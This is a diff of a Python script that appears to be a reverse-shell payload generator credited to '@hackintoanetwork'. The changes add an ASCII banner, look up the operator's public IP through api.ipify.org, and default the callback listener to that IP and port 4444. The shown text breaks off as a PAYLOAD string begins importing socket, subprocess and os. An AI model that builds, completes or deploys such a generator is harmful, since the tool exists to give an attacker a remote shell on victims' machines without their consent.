@@ -1,12 +1,28 @@
 import os
+import socket
+from requests import get
+ip = get("https://api.ipify.org").text
 os.system('clear')
-print("""\033[1;36m
-┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
-├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
-┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m""")
-print("""[ Developer : @hackintoanetwork \033[1;36m|\033[1;m Website: hackintoanetwork.com ]""")
-IP=input("IP : ")
-PORT=input("PORT : ")
+print("""\033[1;36m  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
+  ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
+  ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
+  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐
+  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘
+  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─""")
+print('')
+print("""  [ Coded by @hackintoanetwork \033[1;36m|\033[1;m Website : hackintoanetwork.com ]""")
+print('')
+print("  Host Name : \033[1;36m",socket.gethostname())
+print("  \033[1;mPublic IP : \033[1;36m", ip)
+print('')
+IP=input("  \033[1;mIP : \033[1;36m")
+if IP == '' :
+	print ("  Default -> \033[1;36m", ip)
+	IP = ip
+PORT=input("  \033[1;mPORT : \033[1;36m")
+if PORT == '' :
+	print ("  Default -> 4444")
+	PORT = ("4444")
 PAYLOAD=("""import socket
 import subprocess
 import os
